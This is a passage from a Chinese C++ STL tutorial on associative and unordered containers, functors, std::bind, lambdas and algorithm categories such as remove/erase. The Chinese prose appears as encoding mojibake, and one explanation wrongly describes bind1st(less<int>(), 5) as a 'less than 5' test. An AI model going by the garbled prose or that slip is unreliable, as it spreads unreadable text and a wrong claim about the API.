word_counts.find(&quot;grape&quot;); if (it == word_counts.end()) &#123; std::cout &lt;&lt; &quot;grape not found.\\n&quot;; &#125; // æ³¨æ„ï¼šå¦‚æœä½¿ç”¨ operator[] è®¿é—®ä¸å­˜åœ¨çš„é”®ï¼Œä¼šè‡ªåŠ¨æ’å…¥ä¸€ä¸ªå…·æœ‰é»˜è®¤å€¼çš„å…ƒç´ ï¼ std::cout &lt;&lt; &quot;Count for grape (after []): &quot; &lt;&lt; word_counts[&quot;grape&quot;] &lt;&lt; std::endl; // è¾“å‡º 0ï¼Œå¹¶æ’å…¥äº† &#123;&quot;grape&quot;, 0&#125;&#125; std::multiset&lt;Key&gt;: å…è®¸å­˜å‚¨é‡å¤çš„é”®ï¼Œå…ƒç´ è‡ªåŠ¨æ’åºã€‚ std::multimap&lt;Key, Value&gt;: å…è®¸å­˜å‚¨é‡å¤çš„é”®ï¼Œé”®å€¼å¯¹æ ¹æ®é”®è‡ªåŠ¨æ’åºã€‚æŸ¥æ‰¾ä¼šè¿”å›ä¸€ä¸ªèŒƒå›´ï¼ˆæ‰€æœ‰å…·æœ‰è¯¥é”®çš„å…ƒç´ ï¼‰ã€‚ 16.4.7 æ— åºå…³è”å®¹å™¨ï¼ˆC++11ï¼‰æ— åºå…³è”å®¹å™¨ä½¿ç”¨å“ˆå¸Œè¡¨ (Hash Table) å®ç°ï¼Œå…ƒç´ ä¸ä¿è¯ä»»ä½•ç‰¹å®šé¡ºåºã€‚å®ƒä»¬é€šè¿‡è®¡ç®—é”®çš„å“ˆå¸Œå€¼æ¥ç¡®å®šå…ƒç´ å­˜å‚¨çš„ä½ç½®ï¼ˆæ¡¶ï¼‰ã€‚ ä¼˜ç‚¹: æ’å…¥ã€åˆ é™¤å’ŒæŸ¥æ‰¾çš„å¹³å‡æ—¶é—´å¤æ‚åº¦ä¸º O(1)ï¼Œé€šå¸¸æ¯”å…³è”å®¹å™¨æ›´å¿«ã€‚ ç¼ºç‚¹: æœ€åæƒ…å†µä¸‹çš„æ—¶é—´å¤æ‚åº¦ä¸º O(N)ï¼ˆå½“å‘ç”Ÿå¤§é‡å“ˆå¸Œå†²çªæ—¶ï¼‰ã€‚ å…ƒç´ æ˜¯æ— åºçš„ã€‚ éœ€è¦ä¸ºé”®ç±»å‹æä¾›å“ˆå¸Œå‡½æ•°å’Œç›¸ç­‰æ¯”è¾ƒæ“ä½œï¼ˆæ ‡å‡†åº“ä¸ºåŸºæœ¬ç±»å‹å’Œ string ç­‰æä¾›äº†é»˜è®¤å®ç°ï¼‰ã€‚ å“ˆå¸Œè¡¨æ“ä½œå¯èƒ½ä¼šå¯¼è‡´è¿­ä»£å™¨å¤±æ•ˆã€‚ std::unordered_set&lt;Key&gt;: å­˜å‚¨å”¯ä¸€é”®çš„å“ˆå¸Œé›†åˆã€‚ std::unordered_map&lt;Key, Value&gt;: å­˜å‚¨å”¯ä¸€é”®å€¼å¯¹çš„å“ˆå¸Œæ˜ å°„ã€‚ std::unordered_multiset&lt;Key&gt;: å…è®¸é‡å¤é”®çš„å“ˆå¸Œé›†åˆã€‚ std::unordered_multimap&lt;Key, Value&gt;: å…è®¸é‡å¤é”®çš„å“ˆå¸Œæ˜ å°„ã€‚ ç¤ºä¾‹ (unordered_map): 1234567891011121314151617181920212223242526#include &lt;unordered_map&gt;#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; std::unordered_map&lt;std::string, int&gt; phonebook; phonebook[&quot;Alice&quot;] = 12345; phonebook[&quot;Bob&quot;] = 67890; phonebook.insert(&#123;&quot;Charlie&quot;, 54321&#125;); std::cout &lt;&lt; &quot;Phonebook (order not guaranteed):\\n&quot;; for (const auto&amp; entry : phonebook) &#123; std::cout &lt;&lt; entry.first &lt;&lt; &quot;: &quot; &lt;&lt; entry.second &lt;&lt; std::endl; &#125; std::cout &lt;&lt; &quot;Bob&#x27;s number: &quot; &lt;&lt; phonebook[&quot;Bob&quot;] &lt;&lt; std::endl; if (phonebook.count(&quot;David&quot;)) &#123; // count() è¿”å› 0 æˆ– 1 std::cout &lt;&lt; &quot;David found.\\n&quot;; &#125; else &#123; std::cout &lt;&lt; &quot;David not found.\\n&quot;; &#125; return 0;&#125; æ— åºå®¹å™¨åœ¨ä¸éœ€è¦å…ƒç´ æ’åºä¸”æ³¨é‡å¹³å‡æŸ¥æ‰¾æ€§èƒ½çš„åœºæ™¯ä¸‹éå¸¸æœ‰ç”¨ï¼Œä¾‹å¦‚å®ç°ç¼“å­˜ã€å¿«é€ŸæŸ¥æ‰¾è¡¨ç­‰ã€‚ 16.5 å‡½æ•°å¯¹è±¡åœ¨ STL ä¸­ï¼Œè®¸å¤šç®—æ³•ï¼ˆå¦‚ sort, find_if, for_eachï¼‰ä¸ä»…å¯ä»¥é€šè¿‡è¿­ä»£å™¨æŒ‡å®šæ“ä½œçš„èŒƒå›´ï¼Œè¿˜å¯ä»¥æ¥å—ä¸€ä¸ªé¢å¤–çš„å‚æ•°æ¥å®šåˆ¶å…¶è¡Œä¸ºã€‚è¿™ä¸ªå‚æ•°é€šå¸¸æ˜¯ä¸€ä¸ªå¯è°ƒç”¨ (Callable) çš„å®ä½“ï¼Œç”¨äºæŒ‡å®šæ¯”è¾ƒè§„åˆ™ã€åˆ¤æ–­æ¡ä»¶æˆ–è¦æ‰§è¡Œçš„æ“ä½œã€‚ é™¤äº†æ™®é€šçš„å‡½æ•°æŒ‡é’ˆï¼ŒC++ è¿˜æä¾›äº†ä¸€ç§å¼ºå¤§çš„å¯è°ƒç”¨å®ä½“ï¼š**å‡½æ•°å¯¹è±¡ (Function Object)**ï¼Œä¹Ÿç§°ä¸º **å‡½æ•°ç¬¦ (Functor)**ã€‚ 16.5.1 å‡½æ•°ç¬¦æ¦‚å¿µå‡½æ•°å¯¹è±¡ï¼ˆæˆ–å‡½æ•°ç¬¦ï¼‰æ˜¯ä¸€ä¸ªé‡è½½äº†å‡½æ•°è°ƒç”¨è¿ç®—ç¬¦ operator() çš„ç±»çš„å¯¹è±¡ã€‚è¿™æ„å‘³ç€ä½ å¯ä»¥åƒè°ƒç”¨å‡½æ•°ä¸€æ ·ä½¿ç”¨è¿™ä¸ªå¯¹è±¡ã€‚ åŸºæœ¬ç»“æ„: 1234567891011121314151617181920#include &lt;iostream&gt;// å®šä¹‰ä¸€ä¸ªå‡½æ•°å¯¹è±¡ç±»class MyFunctor &#123;public: // é‡è½½ operator() void operator()(int x) const &#123; // å¯ä»¥æ˜¯ const æˆå‘˜å‡½æ•° std::cout &lt;&lt; &quot;Functor called with value: &quot; &lt;&lt; x &lt;&lt; std::endl; &#125;&#125;;int main() &#123; MyFunctor f; // åˆ›å»ºå‡½æ•°å¯¹è±¡ f(10); // è°ƒç”¨å¯¹è±¡ï¼Œå°±åƒè°ƒç”¨å‡½æ•°ä¸€æ · // ä¹Ÿå¯ä»¥ä¸´æ—¶åˆ›å»ºå¹¶è°ƒç”¨ MyFunctor()(20); return 0;&#125; ä¸ºä»€ä¹ˆä½¿ç”¨å‡½æ•°å¯¹è±¡ï¼Ÿ æºå¸¦çŠ¶æ€: ä¸æ™®é€šå‡½æ•°ä¸åŒï¼Œå‡½æ•°å¯¹è±¡æ˜¯å¯¹è±¡ï¼Œå®ƒå¯ä»¥æ‹¥æœ‰è‡ªå·±çš„æˆå‘˜å˜é‡ï¼ˆçŠ¶æ€ï¼‰ã€‚è¿™äº›çŠ¶æ€å¯ä»¥åœ¨å¤šæ¬¡è°ƒç”¨ä¹‹é—´ä¿æŒï¼Œæˆ–è€…åœ¨åˆ›å»ºæ—¶è¿›è¡Œé…ç½®ã€‚è¿™å¯¹äºéœ€è¦ç´¯åŠ ã€è®¡æ•°æˆ–æ ¹æ®ç‰¹å®šä¸Šä¸‹æ–‡æ“ä½œçš„ç®—æ³•éå¸¸æœ‰ç”¨ã€‚ 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;algorithm&gt; // for for_each// å‡½æ•°å¯¹è±¡ï¼Œç”¨äºè®¡ç®—æ€»å’Œå¹¶è®°å½•è°ƒç”¨æ¬¡æ•°class SumAndCount &#123;private: int sum; int count;public: SumAndCount() : sum(0), count(0) &#123;&#125; // åˆå§‹åŒ–çŠ¶æ€ void operator()(int x) &#123; sum += x; count++; &#125; int getSum() const &#123; return sum; &#125; int getCount() const &#123; return count; &#125;&#125;;int main() &#123; std::vector&lt;int&gt; nums = &#123;1, 2, 3, 4, 5&#125;; SumAndCount sac; // åˆ›å»ºå¸¦æœ‰çŠ¶æ€çš„å‡½æ•°å¯¹è±¡ // å°†å‡½æ•°å¯¹è±¡ä¼ é€’ç»™ for_each ç®—æ³• // for_each ä¼šå¯¹ nums ä¸­çš„æ¯ä¸ªå…ƒç´ è°ƒç”¨ sac.operator() // æ³¨æ„ï¼šfor_each è¿”å›å…¶å‡½æ•°å¯¹è±¡å‚æ•°çš„å‰¯æœ¬ã€‚ // å¦‚æœéœ€è¦è·å–æœ€ç»ˆçŠ¶æ€ï¼Œéœ€è¦æ¥æ”¶è¿”å›å€¼ï¼ˆæˆ–ä½¿ç”¨å¼•ç”¨åŒ…è£…å™¨ï¼‰ sac = std::for_each(nums.begin(), nums.end(), sac); std::cout &lt;&lt; &quot;Sum: &quot; &lt;&lt; sac.getSum() &lt;&lt; std::endl; // è¾“å‡º 15 std::cout &lt;&lt; &quot;Count: &quot; &lt;&lt; sac.getCount() &lt;&lt; std::endl; // è¾“å‡º 5 return 0;&#125; å†…è”å¯èƒ½æ€§: ç¼–è¯‘å™¨é€šå¸¸æ›´å®¹æ˜“å¯¹å‡½æ•°å¯¹è±¡çš„ operator() è¿›è¡Œå†…è” (inline) ä¼˜åŒ–ï¼Œå› ä¸ºå®ƒåœ¨ç¼–è¯‘æ—¶æ˜¯å·²çŸ¥çš„ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼Œé€šè¿‡å‡½æ•°æŒ‡é’ˆè°ƒç”¨å‡½æ•°é€šå¸¸ä¼šé˜»æ­¢å†…è”ï¼Œå¯èƒ½å¸¦æ¥è½»å¾®çš„æ€§èƒ½å¼€é”€ã€‚ ç±»å‹å¤šæ ·æ€§: æ¯ä¸ªå‡½æ•°å¯¹è±¡ç±»éƒ½æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„ç±»å‹ã€‚è¿™å…è®¸æˆ‘ä»¬é€šè¿‡æ¨¡æ¿ç‰¹åŒ–æˆ–é‡è½½æ¥ä¸ºä¸åŒçš„å‡½æ•°å¯¹è±¡æä¾›ä¸åŒçš„è¡Œä¸ºã€‚ 16.5.2 é¢„å®šä¹‰çš„å‡½æ•°ç¬¦æ ‡å‡†åº“åœ¨ &lt;functional&gt; å¤´æ–‡ä»¶ä¸­æä¾›äº†ä¸€ç³»åˆ—å¸¸ç”¨çš„é¢„å®šä¹‰å‡½æ•°ç¬¦ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œçœå»äº†è‡ªå·±ç¼–å†™ç®€å•æ“ä½œç±»çš„éº»çƒ¦ã€‚ å¸¸è§çš„é¢„å®šä¹‰å‡½æ•°ç¬¦åŒ…æ‹¬ï¼š ç®—æœ¯ç±»: plus&lt;T&gt;: æ‰§è¡Œ arg1 + arg2ã€‚ minus&lt;T&gt;: æ‰§è¡Œ arg1 - arg2ã€‚ multiplies&lt;T&gt;: æ‰§è¡Œ arg1 * arg2ã€‚ divides&lt;T&gt;: æ‰§è¡Œ arg1 / arg2ã€‚ modulus&lt;T&gt;: æ‰§è¡Œ arg1 % arg2ã€‚ negate&lt;T&gt;: æ‰§è¡Œ -argã€‚ æ¯”è¾ƒç±»: equal_to&lt;T&gt;: æ‰§è¡Œ arg1 == arg2ã€‚ not_equal_to&lt;T&gt;: æ‰§è¡Œ arg1 != arg2ã€‚ less&lt;T&gt;: æ‰§è¡Œ arg1 &lt; arg2 (é»˜è®¤æ’åºè§„åˆ™)ã€‚ greater&lt;T&gt;: æ‰§è¡Œ arg1 &gt; arg2ã€‚ less_equal&lt;T&gt;: æ‰§è¡Œ arg1 &lt;= arg2ã€‚ greater_equal&lt;T&gt;: æ‰§è¡Œ arg1 &gt;= arg2ã€‚ é€»è¾‘ç±»: logical_and&lt;T&gt;: æ‰§è¡Œ arg1 &amp;&amp; arg2ã€‚ logical_or&lt;T&gt;: æ‰§è¡Œ arg1 || arg2ã€‚ logical_not&lt;T&gt;: æ‰§è¡Œ !argã€‚ ä½¿ç”¨ç¤ºä¾‹: è¿™äº›é¢„å®šä¹‰å‡½æ•°ç¬¦å¸¸ç”¨äºéœ€è¦è‡ªå®šä¹‰æ¯”è¾ƒæˆ–æ“ä½œçš„ STL ç®—æ³•ã€‚ 123456789101112131415161718192021222324252627282930313233#include &lt;vector&gt;#include &lt;algorithm&gt; // for sort, count_if#include &lt;functional&gt; // åŒ…å«é¢„å®šä¹‰å‡½æ•°ç¬¦#include &lt;iostream&gt;int main() &#123; std::vector&lt;int&gt; nums = &#123;5, 2, 8, 1, 9, 4&#125;; // ä½¿ç”¨ greater&lt;int&gt; è¿›è¡Œé™åºæ’åº std::sort(nums.begin(), nums.end(), std::greater&lt;int&gt;()); // ç­‰ä»·äº std::sort(nums.begin(), nums.end(), [](int a, int b)&#123; return a &gt; b; &#125;); std::cout &lt;&lt; &quot;Sorted descending: &quot;; for (int n : nums) &#123; std::cout &lt;&lt; n &lt;&lt; &quot; &quot;; // è¾“å‡º: 9 8 5 4 2 1 &#125; std::cout &lt;&lt; std::endl; // ä½¿ç”¨ less&lt;int&gt; å’Œ bind (æˆ– lambda) æ¥æŸ¥æ‰¾å°äº 5 çš„å…ƒç´ æ•°é‡ // C++11 ä¹‹å‰çš„åšæ³•å¯èƒ½ä½¿ç”¨ bind1st/bind2nd (å·²åºŸå¼ƒ) æˆ– boost::bind // C++11 åŠä»¥åï¼Œlambda æ›´å¸¸ç”¨ï¼š int count_less_than_5 = std::count_if(nums.begin(), nums.end(), [](int x)&#123; return x &lt; 5; &#125;); std::cout &lt;&lt; &quot;Count less than 5: &quot; &lt;&lt; count_less_than_5 &lt;&lt; std::endl; // è¾“å‡º 3 (4, 2, 1) // ä½¿ç”¨é¢„å®šä¹‰å‡½æ•°ç¬¦å’Œ lambda ç»“åˆ (è™½ç„¶æœ‰ç‚¹ç»•) int threshold = 5; count_less_than_5 = std::count_if(nums.begin(), nums.end(), [threshold](int x)&#123; return std::less&lt;int&gt;()(x, threshold); &#125;); std::cout &lt;&lt; &quot;Count less than 5 (lambda+functor): &quot; &lt;&lt; count_less_than_5 &lt;&lt; std::endl; // è¾“å‡º 3 return 0;&#125; 16.5.3 è‡ªé€‚åº”å‡½æ•°ç¬¦å’Œå‡½æ•°é€‚é…å™¨ (æ—§æ¦‚å¿µ)åœ¨ C++11 å¼•å…¥ lambda è¡¨è¾¾å¼ä¹‹å‰ï¼Œä¸ºäº†æ›´çµæ´»åœ°ç»„åˆå’Œä½¿ç”¨å‡½æ•°ç¬¦ï¼ŒSTL æä¾›äº†ä¸€äº›æ›´å¤æ‚çš„æœºåˆ¶ï¼Œå¦‚è‡ªé€‚åº”å‡½æ•°ç¬¦ (Adaptable Functors) å’Œ**å‡½æ•°é€‚é…å™¨ (Function Adapters)**ã€‚ è‡ªé€‚åº”å‡½æ•°ç¬¦: é™¤äº† operator()ï¼Œè¿˜æä¾›äº†ä¸€äº›åµŒå¥—çš„ typedefï¼ˆå¦‚ result_type, first_argument_type, second_argument_typeï¼‰ï¼Œä½¿å¾—é€‚é…å™¨èƒ½å¤Ÿäº†è§£å‡½æ•°ç¬¦çš„å‚æ•°å’Œè¿”å›ç±»å‹ã€‚é¢„å®šä¹‰çš„å‡½æ•°ç¬¦å¤§å¤šæ˜¯è‡ªé€‚åº”çš„ã€‚ å‡½æ•°é€‚é…å™¨: ç”¨äºä¿®æ”¹æˆ–ç»‘å®šå‡½æ•°ç¬¦çš„å‚æ•°ã€‚ ç»‘å®šå™¨ (Binders): å¦‚ bind1st å’Œ bind2nd (åœ¨ C++11 ä¸­åºŸå¼ƒï¼ŒC++17 ä¸­ç§»é™¤)ï¼Œç”¨äºå°†äºŒå…ƒå‡½æ•°ç¬¦çš„ä¸€ä¸ªå‚æ•°ç»‘å®šåˆ°ç‰¹å®šå€¼ï¼Œç”Ÿæˆä¸€ä¸ªä¸€å…ƒå‡½æ•°ç¬¦ã€‚ä¾‹å¦‚ï¼Œbind1st(less&lt;int&gt;(), 5) ä¼šåˆ›å»ºä¸€ä¸ªåˆ¤æ–­å‚æ•°æ˜¯å¦å°äº 5 çš„ä¸€å…ƒå‡½æ•°ç¬¦ã€‚ æ±‚åå™¨ (Negators): å¦‚ not1 å’Œ not2 (åœ¨ C++17 ä¸­åºŸå¼ƒ)ï¼Œç”¨äºå¯¹ä¸€å…ƒæˆ–äºŒå…ƒè°“è¯å‡½æ•°ç¬¦çš„ç»“æœå–åã€‚ä¾‹å¦‚ï¼Œnot1(is_even) ä¼šåˆ›å»ºä¸€ä¸ªåˆ¤æ–­æ˜¯å¦ä¸ºå¥‡æ•°çš„ä¸€å…ƒå‡½æ•°ç¬¦ã€‚ æˆå‘˜å‡½æ•°é€‚é…å™¨: å¦‚ mem_fun å’Œ mem_fun_ref (åœ¨ C++11 ä¸­åºŸå¼ƒï¼ŒC++17 ä¸­ç§»é™¤)ï¼Œç”¨äºå°†æˆå‘˜å‡½æ•°åŒ…è£…æˆå¯ä»¥è¢« STL ç®—æ³•ä½¿ç”¨çš„å‡½æ•°å¯¹è±¡ã€‚ ç°ä»£ C++ çš„æ›¿ä»£æ–¹æ¡ˆ: è¿™äº›æ—§çš„é€‚é…å™¨æœºåˆ¶æ¯”è¾ƒå¤æ‚ä¸”ç”¨æ³•å—é™ã€‚åœ¨ç°ä»£ C++ (C++11 åŠä»¥å) ä¸­ï¼Œå®ƒä»¬çš„åŠŸèƒ½å¾ˆå¤§ç¨‹åº¦ä¸Šè¢«ä»¥ä¸‹ç‰¹æ€§å–ä»£ï¼š std::bind (æ¥è‡ª &lt;functional&gt;): ä¸€ä¸ªæ›´é€šç”¨ã€æ›´å¼ºå¤§çš„ç»‘å®šå™¨ï¼Œå¯ä»¥ç»‘å®šæ™®é€šå‡½æ•°ã€æˆå‘˜å‡½æ•°ã€å‡½æ•°å¯¹è±¡ï¼Œå¹¶çµæ´»åœ°æŒ‡å®šå‚æ•°å ä½ç¬¦ (std::placeholders::_1, _2 ç­‰)ã€‚ Lambda è¡¨è¾¾å¼: æä¾›äº†éå¸¸ç®€æ´å’Œçµæ´»çš„æ–¹å¼æ¥å°±åœ°å®šä¹‰åŒ¿åå‡½æ•°å¯¹è±¡ï¼Œå¯ä»¥æ•è·ä¸Šä¸‹æ–‡å˜é‡ï¼Œæå¤§åœ°ç®€åŒ–äº†éœ€è¦ä¼ é€’è‡ªå®šä¹‰é€»è¾‘ç»™ç®—æ³•çš„åœºæ™¯ã€‚ 12345678910111213141516171819202122#include &lt;vector&gt;#include &lt;algorithm&gt;#include &lt;functional&gt; // for std::bind, std::less, std::placeholders#include &lt;iostream&gt;int main() &#123; std::vector&lt;int&gt; nums = &#123;9, 8, 5, 4, 2, 1&#125;; int threshold = 5; // ä½¿ç”¨ std::bind (æ›¿ä»£ bind1st/bind2nd) // åˆ›å»ºä¸€ä¸ªä¸€å…ƒè°“è¯ï¼Œåˆ¤æ–­ x &lt; threshold auto less_than_threshold = std::bind(std::less&lt;int&gt;(), std::placeholders::_1, threshold); int count1 = std::count_if(nums.begin(), nums.end(), less_than_threshold); std::cout &lt;&lt; &quot;Count (bind): &quot; &lt;&lt; count1 &lt;&lt; std::endl; // è¾“å‡º 3 // ä½¿ç”¨ Lambda è¡¨è¾¾å¼ (æ›´ç®€æ´) int count2 = std::count_if(nums.begin(), nums.end(), [threshold](int x)&#123; return x &lt; threshold; &#125;); std::cout &lt;&lt; &quot;Count (lambda): &quot; &lt;&lt; count2 &lt;&lt; std::endl; // è¾“å‡º 3 return 0;&#125; è™½ç„¶æ—§çš„é€‚é…å™¨å·²è¢«åºŸå¼ƒï¼Œä½†ç†è§£å‡½æ•°å¯¹è±¡çš„åŸºæœ¬æ¦‚å¿µä»ç„¶å¾ˆé‡è¦ï¼Œå› ä¸ºå®ƒä»¬æ˜¯ STL è®¾è®¡çš„åŸºç¡€ï¼Œå¹¶ä¸” lambda è¡¨è¾¾å¼æœ¬è´¨ä¸Šå°±æ˜¯ç¼–è¯‘å™¨ä¸ºæˆ‘ä»¬è‡ªåŠ¨ç”Ÿæˆçš„åŒ¿åå‡½æ•°å¯¹è±¡ã€‚ 16.6 ç®—æ³•STL çš„ç¬¬ä¸‰ä¸ªä¸»è¦ç»„ä»¶æ˜¯**ç®—æ³• (Algorithms)**ã€‚STL æä¾›äº†å¤§é‡ç”¨äºå¤„ç†å®¹å™¨ï¼ˆæˆ–å…¶ä»–åºåˆ—ï¼‰ä¸­æ•°æ®çš„æ¨¡æ¿å‡½æ•°ï¼Œè¿™äº›å‡½æ•°ç»Ÿç§°ä¸ºç®—æ³•ã€‚å®ƒä»¬å®šä¹‰åœ¨ &lt;algorithm&gt; å¤´æ–‡ä»¶ä¸­ï¼ˆè¿˜æœ‰ä¸€äº›æ•°å€¼ç®—æ³•åœ¨ &lt;numeric&gt; ä¸­ï¼‰ã€‚ STL ç®—æ³•æ˜¯æ³›å‹çš„ï¼Œå®ƒä»¬é€šè¿‡è¿­ä»£å™¨ä½œç”¨äºå…ƒç´ èŒƒå›´ï¼Œè€Œä¸ä¾èµ–äºç‰¹å®šå®¹å™¨çš„å®ç°ã€‚è¿™ä½¿å¾—åŒä¸€ä¸ªç®—æ³•å¯ä»¥åº”ç”¨äº vector, list, deque, C é£æ ¼æ•°ç»„ç­‰å¤šç§æ•°æ®ç»“æ„ã€‚ 16.6.1 ç®—æ³•ç»„STL ç®—æ³•å¯ä»¥æ ¹æ®å…¶åŠŸèƒ½å¤§è‡´åˆ†ä¸ºå‡ ç±»ï¼š éä¿®æ”¹åºåˆ—æ“ä½œ (Non-modifying sequence operations): è¿™äº›ç®—æ³•æ£€æŸ¥åºåˆ—ä¸­çš„å…ƒç´ ï¼Œä½†ä¸ä¿®æ”¹å…ƒç´ çš„å€¼ã€‚å®ƒä»¬é€šå¸¸è¿”å›ä¸€ä¸ªè¿­ä»£å™¨ã€ä¸€ä¸ªå¸ƒå°”å€¼æˆ–ä¸€ä¸ªè®¡æ•°å€¼ã€‚ ä¾‹å¦‚: find, find_if, count, count_if, equal, search, for_eachã€‚ ä¿®æ”¹åºåˆ—æ“ä½œ (Modifying sequence operations): è¿™äº›ç®—æ³•ä¼šä¿®æ”¹åºåˆ—ä¸­çš„å…ƒç´ å€¼æˆ–å…ƒç´ é¡ºåºã€‚ ä¾‹å¦‚: copy, copy_if, move, transform, replace, replace_if, fill, generate, remove, remove_if, unique, reverse, rotate, random_shuffle (C++17 åºŸå¼ƒ), shuffle (C++11)ã€‚ æ’åºå’Œç›¸å…³æ“ä½œ (Sorting and related operations): ç”¨äºå¯¹åºåˆ—è¿›è¡Œæ’åºæˆ–æ‰§è¡ŒåŸºäºæ’åºçš„æ“ä½œã€‚ ä¾‹å¦‚: sort, stable_sort, partial_sort, nth_element, binary_search, lower_bound, upper_bound, equal_range, merge, inplace_mergeã€‚ æ•°å€¼æ“ä½œ (Numeric operations): å®šä¹‰åœ¨ &lt;numeric&gt; å¤´æ–‡ä»¶ä¸­ï¼Œç”¨äºæ‰§è¡Œæ•°å€¼è®¡ç®—ã€‚ ä¾‹å¦‚: accumulate, inner_product, partial_sum, adjacent_difference, iota (C++11)ã€‚ å †æ“ä½œ (Heap operations): ç”¨äºå°†èŒƒå›´ç»´æŠ¤æˆå †ç»“æ„ã€‚ ä¾‹å¦‚: make_heap, push_heap, pop_heap, sort_heapã€‚ æœ€å°/æœ€å¤§æ“ä½œ (Min/max operations): ä¾‹å¦‚: min, max, minmax (C++11), min_element, max_element, minmax_element (C++11)ã€‚ æ’åˆ—æ“ä½œ (Permutation operations): ä¾‹å¦‚: next_permutation, prev_permutationã€‚ 16.6.2 ç®—æ³•çš„é€šç”¨ç‰¹å¾ åŸºäºè¿­ä»£å™¨: ç®—æ³•é€šå¸¸æ¥å—ä¸€å¯¹è¿­ä»£å™¨ first å’Œ last ä½œä¸ºå‚æ•°ï¼ŒæŒ‡å®šè¦æ“ä½œçš„å·¦é—­å³å¼€åŒºé—´ [first, last)**ã€‚last æŒ‡å‘çš„æ˜¯è¦å¤„ç†çš„æœ€åä¸€ä¸ªå…ƒç´ çš„ä¸‹ä¸€ä¸ª**ä½ç½®ã€‚ ä¸æ£€æŸ¥è¾¹ç•Œ: å¤§å¤šæ•°ç®—æ³•å‡å®šä¼ å…¥çš„è¿­ä»£å™¨èŒƒå›´æ˜¯æœ‰æ•ˆçš„ã€‚ä¼ é€’æ— æ•ˆèŒƒå›´ï¼ˆå¦‚ end() åœ¨ begin() ä¹‹å‰ï¼Œæˆ–è¿­ä»£å™¨æŒ‡å‘ä¸åŒå®¹å™¨ï¼‰ä¼šå¯¼è‡´æœªå®šä¹‰è¡Œä¸ºã€‚ ä¸æ”¹å˜å®¹å™¨å¤§å° (é€šå¸¸): ä¿®æ”¹åºåˆ—çš„ç®—æ³•ï¼ˆå¦‚ replace, removeï¼‰é€šå¸¸åªè¦†ç›–æˆ–ç§»åŠ¨å…ƒç´ ï¼Œè€Œä¸æ”¹å˜å®¹å™¨çš„å¤§å°ã€‚ä¾‹å¦‚ï¼Œremove åªæ˜¯å°†ä¸è¢«ç§»é™¤çš„å…ƒç´ ç§»åŠ¨åˆ°åºåˆ—çš„å‰éƒ¨ï¼Œå¹¶è¿”å›ä¸€ä¸ªæŒ‡å‘æ–°çš„é€»è¾‘æœ«å°¾çš„è¿­ä»£å™¨ï¼Œå®ƒä¸ä¼šçœŸæ­£åˆ é™¤å®¹å™¨ä¸­çš„å…ƒç´ ã€‚é€šå¸¸éœ€è¦é…åˆå®¹å™¨çš„ erase æ–¹æ³•æ¥å®é™…åˆ é™¤å…ƒç´ ã€‚ 1234567891011121314151617181920212223242526#include &lt;vector&gt;#include &lt;algorithm&gt;#include &lt;iostream&gt;int main() &#123; std::vector&lt;int&gt; v = &#123;1, 2, 3, 2, 4, 2, 5&#125;; int val_to_remove = 2; // ä½¿ç”¨ remove å°†æ‰€æœ‰ä¸ç­‰äº 2 çš„å…ƒç´ ç§»åˆ°å‰é¢ auto new_end = std::remove(v.begin(), v.end(), val_to_remove); // v ç°åœ¨å¯èƒ½æ˜¯ &#123;1, 3, 4, 5, ?, ?, ?&#125; (é—®å·ä»£è¡¨æœªå®šä¹‰çš„å€¼) // new_end æŒ‡å‘ç¬¬ä¸€ä¸ªé—®å·çš„ä½ç½® (é€»è¾‘ä¸Šçš„æ–°æœ«å°¾) std::cout &lt;&lt; &quot;Vector after remove (before erase): &quot;; for(int x : v) std::cout &lt;&lt; x &lt;&lt; &quot; &quot;; // è¾“å‡ºå¯èƒ½åŒ…å«æœªå®šä¹‰å€¼ std::cout &lt;&lt; &quot;\\nSize before erase: &quot; &lt;&lt; v.size() &lt;&lt; std::endl; // size ä»ç„¶æ˜¯ 7 // ä½¿ç”¨ erase åˆ é™¤ä» new_end åˆ°åŸå§‹æœ«å°¾çš„å…ƒç´  v.erase(new_end, v.end()); std::cout &lt;&lt; &quot;Vector after erase: &quot;; for(int x : v) std::cout &lt;&lt; x &lt;&lt; &quot; &quot;; // è¾“å‡º: 1 3 4 5 std::cout &lt;&lt; &quot;\\nSize after erase: &quot; &lt;&lt; v.size() &lt;&lt; std::endl; // size å˜ä¸º 4 return 0;&#125; æ¥å—å‡½æ•°å¯¹è±¡/Lambda: è®¸å¤šç®—æ³•æ¥å—ä¸€ä¸ªé¢å¤–çš„å‚æ•°ï¼ˆé€šå¸¸æ˜¯æœ€åä¸€ä¸ªå‚æ•°ï¼‰ï¼Œç”¨äºæŒ‡å®šè‡ªå®šä¹‰çš„æ¯”è¾ƒé€»è¾‘ï¼ˆå¦‚ sort çš„æ¯”è¾ƒå‡½æ•°ï¼‰ã€åˆ¤æ–­æ¡ä»¶ï¼ˆå¦‚ find_if, count_if çš„è°“è¯ï¼‰æˆ–è¦æ‰§è¡Œçš„æ“ä½œï¼ˆå¦‚ for_each, transform çš„å‡½æ•°ï¼‰ã€‚è¿™å¯ä»¥æ˜¯å‡½æ•°æŒ‡é’ˆã€å‡½æ•°å¯¹è±¡æˆ– lambda è¡¨è¾¾å¼ã€‚ è°“è¯ (Predicate): æ¥å—ä¸€ä¸ªæˆ–ä¸¤ä¸ªå‚æ•°å¹¶è¿”å› bool å€¼çš„å¯è°ƒç”¨å®ä½“ã€‚ ä¸€å…ƒè°“è¯: bool pred(const Type&amp; a)ï¼Œç”¨äº find_if, count_if, remove_if ç­‰ã€‚ äºŒå…ƒè°“è¯: bool pred(const Type&amp; a, const Type&amp; b)ï¼Œç”¨äº sort, unique ç­‰ï¼Œé€šå¸¸è¡¨ç¤ºæŸç§é¡ºåºå…³ç³»ï¼ˆå¦‚â€œå°äºâ€ï¼‰ã€‚ ç¤ºä¾‹ (ä½¿ç”¨ç®—æ³•å’Œ Lambda): 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;vector&gt;#include &lt;string&gt;#include &lt;algorithm&gt;#include &lt;iostream&gt;#include &lt;numeric&gt; // for accumulatestruct Person &#123; std::string name; int age;&#125;;int main() &#123; std::vector&lt;int&gt; nums = &#123;3, 1, 4, 1, 5, 9, 2, 6&#125;; // 1. find_if: æŸ¥æ‰¾ç¬¬ä¸€ä¸ªå¶æ•° auto it_even = std::find_if(nums.begin(), nums.end(), [](int x)&#123; return x % 2 == 0; 